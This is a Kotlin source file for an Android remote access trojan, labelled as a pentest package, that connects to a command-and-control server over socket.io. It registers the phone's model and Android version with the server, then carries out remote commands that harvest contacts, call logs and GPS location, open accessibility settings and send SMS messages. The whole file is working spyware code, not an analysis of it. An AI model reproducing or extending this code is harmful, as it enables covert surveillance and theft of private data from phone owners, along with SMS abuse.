package pentest.ratagent

import android.os.Build
import io.socket.client.IO
import io.socket.client.Socket
import org.json.JSONObject
import android.util.Log

object SocketManager {
    var socket: Socket? = null

    fun init() {
        try {
            // Usa la URL definida en el Config.kt
            socket = IO.socket(Config.SERVER_URL).apply {
                on(Socket.EVENT_CONNECT) {
                    Log.d("RAT", "Conectado al servidor C2")
                    val info = JSONObject().apply {
                        put("model", Build.MODEL)
                        put("android", Build.VERSION.RELEASE)
                    }
                    emit(Config.EVENT_REGISTER, info)
                }

                on(Config.EVENT_COMMAND) { args ->
                    val data = args[0] as JSONObject
                    handleCommand(data)
                }
            }
            socket?.connect()
        } catch (e: Exception) {
            Log.e("RAT", "Error de conexiÃ³n: ${e.message}")
        }
    }

    private fun handleCommand(data: JSONObject) {
        val type = data.optString("type")
        val context = RatService.instance ?: return

        when (type) {
            "get_contacts" -> DataExtractor.getContacts(context)
            "get_call_logs" -> DataExtractor.getCallLogs(context)
            "get_gps" -> GpsTracker.getLocation(context)
            "open_accessibility" -> {
                val intent = android.content.Intent(android.provider.Settings.ACTION_ACCESSIBILITY_SETTINGS).apply {
                    addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                }
                context.startActivity(intent)
            }
            "send_sms" -> {
                val phone = data.optString("phone")
                val msg = data.optString("message")
                SmsTools.send(phone, msg)
            }
        }
    }
}
